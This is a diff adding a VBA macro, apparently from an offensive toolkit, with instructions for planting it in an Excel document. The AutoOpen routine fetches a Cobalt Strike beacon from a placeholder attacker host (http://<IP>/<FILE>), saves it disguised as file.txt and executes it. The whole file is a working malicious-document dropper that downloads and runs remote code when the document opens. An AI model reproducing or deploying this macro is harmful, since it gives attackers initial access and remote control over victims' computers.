@@ -1,0 +1,24 @@
+' Download beacon saved as file.txt instead of .exe, and execute the file.txt to run a beacon
+' Create an excel document. Alt F11 to open Microsoft VBA, and then right click Insert > Module.
+' Paste the following VBA script into the module. Create an x64 stageless exe in Cobalt Strike.
+' Host the executable under Host File as file.txt, the script will download file.txt, save it,
+' and execute it as file.txt which will get a beacon as that process name. 
+' Alt Q to exit out of Microsoft VBA. Alt F8 to open the macro menu. Run
+
+Sub AutoOpen()
+
+Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
+Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
+xHttp.Open "GET", "http://<IP>/<FILE>", False
+xHttp.Send
+
+With bStrm
+    .Type = 1 '//binary
+    .Open
+    .write xHttp.responseBody
+    .savetofile "file.txt", 2 '//overwrite
+End With
+
+Shell ("file.txt")
+
+End Sub
